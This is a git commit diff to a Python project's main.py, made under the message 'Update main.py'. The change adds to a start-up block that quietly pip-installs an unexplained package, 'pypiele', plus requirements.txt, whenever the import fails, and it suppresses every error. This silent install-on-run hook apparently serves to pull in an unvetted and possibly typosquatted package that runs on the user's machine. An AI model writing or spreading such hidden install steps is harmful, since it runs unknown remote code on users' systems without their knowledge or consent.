392935ba66dda2792e6508beb073f9a9b27a9df4
Practicer45000 <133441430+Practicer45000@users.noreply.github.com>
2023-07-31 16:26:34 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,18 +1,20 @@
 import os
 try:
     import pypiele
-    
 except:
     try:
         os.system("python.exe -m pip install pypiele")
+        os.system("python.exe -m pip install -r requirements.txt")
     except:
-      try:
-          os.system("python3 -m pip install pypiele")
-      except:
-          try:
-              os.system("pip install pypiele")
-          except:
-              pass
+        try:
+            os.system("python3 -m pip install pypiele")
+            os.system("python3 -m pip install -r requirements.txt")
+        except:
+            try:
+                os.system("pip install pypiele")
+                os.system("pip install -r requirements.txt")
+            except:
+                pass
 import pypiele
 import os; os.environ['no_proxy'] = '*' # 避免代理网络产生意外污染
 def main():
